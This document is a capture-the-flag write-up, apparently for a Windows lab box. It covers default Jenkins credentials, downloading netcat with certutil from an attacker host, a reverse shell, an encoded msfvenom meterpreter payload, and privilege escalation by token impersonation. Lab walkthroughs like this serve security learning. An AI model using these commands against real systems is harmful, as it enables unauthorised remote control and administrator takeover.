after scanning you find an open port on 8080 which turns out to be a jenkins login page

it still uses defaults of ```admin:admin```

Gets windows nc, put into jenkins build commands

```bash
certutil.exe -urlcache -split -f "http://<ip>:8000/tools/windows-connect/nc.exe" %tmp%\nc.exe
```

run another command while you have a nc listener

```bash
%tmp%\nc.exe <ip> 1234 -e cmd.exe
```

this will get your reverse shell and you can get the flag off bruce's desktop

generate a windows reverse shell file for meterpreter

```
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.4.28.132 LPORT=5555 -f exe -o reboot.exe
```

get the file onto the computer

```bash
certutil.exe -urlcache -split -f "http://<ip>:8000/try-hack-me/offensive-pen-testing/alfred/reboot.exe"
```

have this running so it drops into the meterpreter shell when you execute

```bash
use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST <ip> set LPORT 5555 run
```

```
.\reboot.exe
```

view all the privileges

```
whoami /priv
```

```
You can see that two privileges(SeDebugPrivilege, SeImpersonatePrivilege) are enabled. Let's use the incognito module that will allow us to exploit this vulnerability.
```

```
To check which tokens are available, enter the list_tokens -g. We can see that the BUILTIN\Administrators token is available. Use the impersonate_token "BUILTIN\Administrators" command to impersonate the Administrators token.
```

```
Even though you have a higher privileged token you may not actually have the permissions of a privileged user (this is due to the way Windows handles permissions - it uses the Primary Token of the process and not the impersonated token to determine what the process can or cannot do). Ensure that you migrate to a process with correct permissions (above questions answer). The safest process to pick is the services.exe process. First use the ps command to view processes and find the PID of the services.exe process. Migrate to this process using the command migrate PID-OF-PROCESS
```